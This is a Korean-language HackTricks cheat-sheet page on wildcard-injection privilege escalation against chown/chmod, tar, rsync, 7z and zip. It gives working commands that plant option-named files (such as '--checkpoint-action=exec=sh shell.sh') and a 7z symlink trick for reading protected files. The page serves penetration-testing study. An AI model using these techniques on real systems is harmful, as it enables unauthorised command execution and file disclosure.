{{#include ../../banners/hacktricks-training.md}}

## chown, chmod

당신은 **나머지 파일에 대해 복사하고 싶은 파일 소유자와 권한을 지정할 수 있습니다**
```bash
touch "--reference=/my/own/path/filename"
```
이것은 [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(결합 공격)_을 사용하여 악용할 수 있습니다.\
자세한 정보는 [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)에서 확인하세요.

## Tar

**임의의 명령 실행:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
이것은 [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar 공격)_을 사용하여 악용할 수 있습니다.\
자세한 내용은 [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)에서 확인하세요.

## Rsync

**임의의 명령 실행:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
이것은 [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_을 사용하여 악용할 수 있습니다.\
자세한 정보는 [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)에서 확인하세요.

## 7z

**7z**에서는 `--`를 `*` 앞에 사용하더라도(여기서 `--`는 다음 입력이 매개변수로 처리될 수 없음을 의미하므로 이 경우 파일 경로만 해당됨) 임의의 오류를 발생시켜 파일을 읽을 수 있습니다. 따라서 다음과 같은 명령이 root에 의해 실행되고 있다면:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
그리고 이 명령이 실행되는 폴더에 파일을 생성할 수 있으며, `@root.txt` 파일과 읽고 싶은 파일에 대한 **symlink**인 `root.txt` 파일을 생성할 수 있습니다:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
그런 다음 **7z**가 실행되면 `root.txt`를 압축해야 할 파일 목록이 포함된 파일로 처리합니다(그것이 `@root.txt`의 존재가 나타내는 것입니다) 그리고 7z가 `root.txt`를 읽을 때 `/file/you/want/to/read`를 읽게 되며 **이 파일의 내용이 파일 목록이 아니기 때문에 오류를 발생시킵니다** 내용이 표시됩니다.

_더 많은 정보는 HackTheBox의 CTF 박스 Write-ups에서 확인하세요._

## Zip

**임의의 명령 실행:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{{#include ../../banners/hacktricks-training.md}}
